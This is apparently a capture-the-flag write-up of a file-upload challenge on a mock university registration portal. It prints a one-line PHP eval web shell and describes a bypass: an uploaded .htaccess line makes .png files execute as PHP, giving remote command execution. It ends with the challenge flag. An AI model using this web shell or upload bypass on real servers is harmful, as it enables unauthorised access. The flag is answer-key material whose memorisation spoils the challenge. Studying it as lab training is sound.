## Challenge Discription 

`A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.`

## Intuition 

This challenge allows us to upload a picture file to the school's server, this immediately made me think possiblities of uploading a php webshell to gain remote access.

## What I tried at first

### Uploading a php file
I made a php file(1.php) containing the following php code:

`<?php @eval($_POST['cmd']); ?>`

and the server returned that it is not allowed.

### Renaming the php file
by renaming it with the name 1.png, it was able to upload successfully, but it just displayed the php code as plain text, not very helpful. 

## Solution
Based on the hint, we can actually create a `.htaccess` file and upload it to the server to let it run any file extension as a php file. This file only contained one line:
```AddType application/x-httpd-php .png```
and by uploading this file to the server, then uploading our 1.png file, we will be able to have remote access to the server. 

Now, just use your favourite webshell managing software to browse through the directory.

the flag was stored at:/var/www/flag.txt

#### Flag:academy{s3rv3r_byp4ss_350bad65}
